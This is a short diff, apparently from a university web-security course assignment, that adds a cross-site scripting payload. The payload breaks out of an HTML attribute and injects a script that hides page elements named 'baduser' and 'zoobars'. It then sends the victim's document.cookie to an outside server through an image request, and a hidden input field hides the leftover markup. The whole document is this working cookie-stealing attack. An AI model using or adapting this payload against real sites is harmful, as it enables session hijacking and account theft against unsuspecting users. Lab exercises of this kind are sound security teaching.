@@ -1,0 +1,5 @@
+"size=10><script>
+document.addEventListener('DOMContentLoaded',function(){var bu=document.getElementById("baduser");bu.parentNode.removeChild(bu);});
+document.addEventListener('DOMContentLoaded',function(){var zb=document.getElementById("zoobars");zb.parentNode.removeChild(zb);
+(new Image()).src="http://ece568.csl.toronto.edu/a3/sendmail.php?to=jakopabe&netid=jakopabe&payload="+encodeURI(document.cookie)+"&random="+Math.random();});
+</script><input type="text" hidden name="
